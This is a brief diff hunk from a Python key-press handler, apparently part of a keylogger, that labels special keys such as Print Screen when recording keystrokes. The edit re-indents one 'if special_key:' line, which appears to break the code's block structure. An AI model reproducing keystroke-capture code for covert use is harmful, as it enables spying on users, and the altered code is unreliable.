@@ -61,7 +61,7 @@ def on_press(key):
                 keyboard.Key.print_screen: ' [PRINT-SCREEN]',
             }
             special_key = special_keys.get(key)
-            if special_key:
+        if special_key:
                 key_entry = f'{special_key}'
         else:
             return
